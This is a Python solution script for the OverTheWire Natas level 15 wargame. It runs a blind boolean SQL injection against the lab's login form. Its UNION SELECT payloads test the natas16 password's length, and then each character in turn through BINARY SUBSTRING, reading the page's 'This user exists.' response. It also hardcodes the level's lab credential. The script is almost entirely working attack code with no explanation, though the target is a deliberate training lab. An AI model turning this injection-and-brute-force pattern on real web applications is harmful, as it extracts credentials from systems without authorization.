import requests
from requests.auth import HTTPBasicAuth
import string
url = "http://natas15.natas.labs.overthewire.org"
key = ''
a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
length=int(input('input max length to password :'))+int(1)
for i in range(1,length,1) :
    username = {'username' : '" UNION SELECT \'a\',\'a\' FROM users WHERE username = \'natas16\' and length(Password) = '+str(i)+'-- '}
    r = requests.post(url, auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = username)
    print('checking password length : ' + str(i))
    if "This user exists." in r.text:
        passlength = int(i)+1
        print('passwordlength = '+str(i))
        for i in range(1,passlength,1):
            for j in a:
                username = {'username' : '" UNION SELECT \'a\',\'a\' FROM users WHERE username = \'natas16\' and BINARY SUBSTRING(Password, '+str(i)+', 1) = \''+str(j)+'\'-- '}
                r = requests.post(url, auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = username)
                print('bruteforcing')
                if "This user exists." in r.text:
                    key += str(j)
                    print('letterfound = '+ key)
                    if len(key) == int(passlength) - int(1):
                        print('password = ' + key)
                        break
                    else :
                        continue
                else :
                    continue
    else:
        continue
        
